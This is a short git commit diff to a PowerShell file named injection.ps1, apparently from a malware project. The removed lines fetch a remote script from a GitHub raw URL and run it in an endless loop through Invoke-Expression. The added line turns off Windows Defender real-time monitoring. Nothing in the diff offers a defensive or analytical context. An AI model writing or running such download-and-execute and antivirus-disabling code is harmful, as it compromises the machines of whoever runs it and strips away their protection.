1ca24f85f43f23f9d36405be0b80364cca27836d
43a1723 <hai1723notgay@gmail.com>
2024-06-13 20:51:13 +0700

    Update injection.ps1

--- injection.ps1
+++ injection.ps1
@@ -1,4 +1,1 @@
-$scriptContent = Invoke-WebRequest -uri "https://raw.githubusercontent.com/43a1723/test/main/startup.ps1" -UseBasicParsing
-while ($true) {
-    Invoke-Expression $scriptContent.Content
-}
+Set-MpPreference -DisableRealtimeMonitoring $true
